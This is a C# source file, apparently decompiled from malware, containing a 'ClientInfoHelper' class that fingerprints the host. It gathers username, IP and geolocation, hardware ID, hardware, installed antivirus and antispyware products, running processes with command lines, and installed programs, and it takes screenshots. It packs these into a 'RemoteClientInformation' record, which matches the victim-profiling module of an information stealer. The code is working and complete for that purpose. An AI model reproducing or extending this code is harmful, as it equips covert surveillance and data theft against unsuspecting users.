using Microsoft.Win32;
using NoiseMe.Drags.App.Data.WMI;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Windows.Forms;

namespace NoiseMe.Drags.App.Models.LocalModels
{
	public static class ClientInfoHelper
	{
		private static Random rnd = new Random();

		public static RemoteClientInformation Create(string SourceID)
		{
			try
			{
				GeoLocationHelper.Initialize();
				Size screenSize = GetScreenSize();
				string text = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
				if (!text.StartsWith("-"))
				{
					text = "+" + text;
				}
				return new RemoteClientInformation
				{
					ID = 0,
					LogTime = DateTime.Now,
					SourceID = SourceID,
					UserName = Environment.UserName,
					ClientIP = GeoLocationHelper.GeoInfo.Query,
					Country = GeoLocationHelper.GeoInfo.CountryCode,
					OperationSystem = ParseOS(),
					HardwareID = ParseHWID(),
					Hardwares = ParseHardwares(),
					Antiviruses = ParseDefenders(),
					Languages = AvailableLanguages(),
					CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
					MonitorSize = $"{screenSize.Width}x{screenSize.Height}",
					TimeZone = "UTC" + text,
					City = GeoLocationHelper.GeoInfo.City
				};
			}
			catch
			{
				return null;
			}
		}

		public static List<RemoteProcess> ListOfProcesses()
		{
			List<RemoteProcess> list = new List<RemoteProcess>();
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher($"SELECT * FROM Win32_Process Where SessionId='{Process.GetCurrentProcess().SessionId}'"))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementObject item2 in managementObjectCollection)
						{
							try
							{
								RemoteProcess item = new RemoteProcess
								{
									ProcessID = Convert.ToInt32(item2["ProcessId"]?.ToString()),
									ProcessCommandLine = item2["CommandLine"]?.ToString(),
									ProcessName = item2["Name"]?.ToString(),
									ProcessUsername = Environment.MachineName + "\\" + Environment.UserName
								};
								list.Add(item);
							}
							catch (Exception value)
							{
								Console.WriteLine(value);
							}
						}
						return list;
					}
				}
			}
			catch
			{
				return list;
			}
		}

		public static List<string> ListOfPrograms()
		{
			List<string> list = new List<string>();
			try
			{
				using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall"))
				{
					string[] subKeyNames = registryKey.GetSubKeyNames();
					foreach (string name in subKeyNames)
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name))
						{
							string text = (string)registryKey2?.GetValue("DisplayName");
							if (!string.IsNullOrEmpty(text))
							{
								list.Add(text);
							}
						}
					}
					return list;
				}
			}
			catch
			{
				return list;
			}
		}

		public static List<string> AvailableLanguages()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (InputLanguage installedInputLanguage in InputLanguage.InstalledInputLanguages)
				{
					list.Add(installedInputLanguage.Culture.EnglishName);
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		public static string GetCommandLine(Process process)
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT CommandLine FROM Win32_Process WHERE ProcessId = " + process.Id))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					using (ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectCollection.GetEnumerator())
					{
						if (managementObjectEnumerator.MoveNext())
						{
							return managementObjectEnumerator.Current["CommandLine"]?.ToString();
						}
					}
					return "";
				}
			}
		}

		private static List<Hardware> ParseHardwares()
		{
			List<Hardware> list = new List<Hardware>();
			try
			{
				foreach (Processor processor in HardwareGatherer.GetProcessors())
				{
					list.Add(new Hardware
					{
						Caption = processor.Name,
						Parameter = processor.NumberOfCores.ToString(),
						HardType = HardwareType.Processor
					});
				}
				foreach (GraphicsCard graphicsCard in HardwareGatherer.GetGraphicsCards())
				{
					list.Add(new Hardware
					{
						Caption = graphicsCard.Name,
						Parameter = graphicsCard.MemoryCapacity.ToString(),
						HardType = HardwareType.Graphic
					});
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static string ParseOS()
		{
			try
			{
				return OsGatherer.GetCaption() + " " + OsGatherer.GetOSArchitecture();
			}
			catch
			{
				return "UNKNOWN";
			}
		}

		private static string ParseHWID()
		{
			try
			{
				return DataRecoveryHelper.GetMd5Hash(HardwareGatherer.GetHwid(HwidStrength.Strong, ignoreNullValues: true)).Replace("-", string.Empty);
			}
			catch
			{
				return "UNKNOWN";
			}
		}

		public static byte[] CaptureScreen()
		{
			return ImageToByte(GetScreenshot());
		}

		private static Bitmap GetScreenshot()
		{
			try
			{
				Size screenSize = GetScreenSize();
				Bitmap bitmap = new Bitmap(screenSize.Width, screenSize.Height);
				using (Graphics graphics = Graphics.FromImage(bitmap))
				{
					graphics.InterpolationMode = InterpolationMode.Bicubic;
					graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
					graphics.SmoothingMode = SmoothingMode.HighSpeed;
					graphics.CopyFromScreen(new Point(0, 0), new Point(0, 0), screenSize);
				}
				return bitmap;
			}
			catch
			{
				return null;
			}
		}

		private static byte[] ImageToByte(Image img)
		{
			try
			{
				if (img != null)
				{
					using (MemoryStream memoryStream = new MemoryStream())
					{
						img.Save(memoryStream, ImageFormat.Png);
						return memoryStream.ToArray();
					}
				}
				return null;
			}
			catch
			{
				return null;
			}
		}

		private static Size GetScreenSize()
		{
			return Screen.PrimaryScreen.Bounds.Size;
		}

		public static List<string> ParseDefenders()
		{
			List<string> list = new List<string>();
			try
			{
				list.AddRange(ParseAntiViruses().IsNull(new List<string>()));
				foreach (string item in ParseSpyWares().IsNull(new List<string>()))
				{
					if (!list.Contains(item))
					{
						list.Add(item);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		public static IEnumerable<string> ParseAntiViruses()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct securityProduct in SecurityGatherer.GetSecurityProducts(SecurityProductType.AntiVirus))
				{
					list.Add(securityProduct.Name);
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static IEnumerable<string> ParseSpyWares()
		{
			List<string> list = new List<string>();
			try
			{
				foreach (SecurityProduct securityProduct in SecurityGatherer.GetSecurityProducts(SecurityProductType.AntiSpyware))
				{
					list.Add(securityProduct.Name);
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static string RandomIp()
		{
			return $"{rnd.Next(1, 255)}.{rnd.Next(0, 255)}.{rnd.Next(0, 255)}.{rnd.Next(0, 255)}";
		}

		public static RemoteClientInformation CreateRandom(string SourceID)
		{
			try
			{
				GeoLocationHelper.Initialize();
				Size screenSize = GetScreenSize();
				string text = TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).ToString();
				if (!text.StartsWith("-"))
				{
					text = "+" + text;
				}
				return new RemoteClientInformation
				{
					ID = 0,
					LogTime = DateTime.Now,
					SourceID = SourceID,
					UserName = Environment.UserName,
					ClientIP = RandomIp(),
					Country = GeoLocationHelper.GeoInfo.CountryCode,
					OperationSystem = ParseOS(),
					HardwareID = ParseHWID(),
					Hardwares = ParseHardwares(),
					Antiviruses = ParseDefenders(),
					Languages = AvailableLanguages(),
					CurrentLanguage = InputLanguage.CurrentInputLanguage.Culture.EnglishName,
					MonitorSize = $"{screenSize.Width}x{screenSize.Height}",
					TimeZone = "UTC" + text,
					City = GeoLocationHelper.GeoInfo.City
				};
			}
			catch
			{
				return null;
			}
		}
	}
}
